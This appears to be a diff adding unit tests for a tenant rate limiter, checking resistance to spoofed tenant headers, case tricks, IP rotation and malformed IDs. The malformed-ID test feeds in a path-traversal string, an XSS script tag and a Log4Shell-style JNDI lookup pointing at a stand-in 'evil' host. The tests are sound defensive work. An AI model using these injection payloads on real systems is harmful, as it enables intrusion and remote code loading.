@@ -19,6 +19,7 @@ function createMockReq(overrides: Partial<Request & { auth?: { tenantId?: string
     path: '/api/v1/playbooks',
     ip: '203.0.113.50',
     socket: { remoteAddress: '203.0.113.50' },
+    headers: {},
     auth: { tenantId: 'tenant-a' },
     ...overrides,
   } as Request;
@@ -103,5 +104,94 @@ describe('createTenantRateLimiter', () => {
 
     expect(next).toHaveBeenCalledTimes(2);
     expect(res3.statusCode).toBe(429);
+  });
+
+  it('ignores spoofed tenant headers when auth context is present', async () => {
+    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });
+
+    const res1 = createMockRes();
+    await limiter(
+      createMockReq({
+        auth: { tenantId: 'tenant-a' },
+        headers: { 'x-tenant-id': ['tenant-a', 'tenant-b'] },
+      }),
+      res1 as Response,
+      next
+    );
+
+    const res2 = createMockRes();
+    await limiter(
+      createMockReq({
+        auth: { tenantId: 'tenant-a' },
+        headers: { 'x-tenant-id': ['tenant-b', 'tenant-a'] },
+      }),
+      res2 as Response,
+      next
+    );
+
+    expect(next).toHaveBeenCalledTimes(1);
+    expect(res2.statusCode).toBe(429);
+  });
+
+  it('normalizes tenant IDs to prevent case-based bypass', async () => {
+    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });
+
+    const res1 = createMockRes();
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-1' } }), res1 as Response, next);
+
+    const res2 = createMockRes();
+    await limiter(createMockReq({ auth: { tenantId: 'TENANT-1' } }), res2 as Response, next);
+
+    expect(next).toHaveBeenCalledTimes(1);
+    expect(res2.statusCode).toBe(429);
+  });
+
+  it('falls back to IP for malformed tenant IDs', async () => {
+    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 2 });
+
+    const res1 = createMockRes();
+    await limiter(
+      createMockReq({ auth: { tenantId: '../tenant-a' }, ip: '198.51.100.9' }),
+      res1 as Response,
+      next
+    );
+
+    const res2 = createMockRes();
+    await limiter(
+      createMockReq({ auth: { tenantId: '<script>alert(1)</script>' }, ip: '198.51.100.9' }),
+      res2 as Response,
+      next
+    );
+
+    const res3 = createMockRes();
+    await limiter(
+      createMockReq({ auth: { tenantId: '${jndi:ldap://evil}' }, ip: '198.51.100.9' }),
+      res3 as Response,
+      next
+    );
+
+    expect(next).toHaveBeenCalledTimes(2);
+    expect(res3.statusCode).toBe(429);
+  });
+
+  it('does not allow IP rotation to bypass tenant limits', async () => {
+    const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });
+
+    const res1 = createMockRes();
+    await limiter(
+      createMockReq({ auth: { tenantId: 'tenant-a' }, ip: '198.51.100.10' }),
+      res1 as Response,
+      next
+    );
+
+    const res2 = createMockRes();
+    await limiter(
+      createMockReq({ auth: { tenantId: 'tenant-a' }, ip: '198.51.100.11' }),
+      res2 as Response,
+      next
+    );
+
+    expect(next).toHaveBeenCalledTimes(1);
+    expect(res2.statusCode).toBe(429);
   });
 });
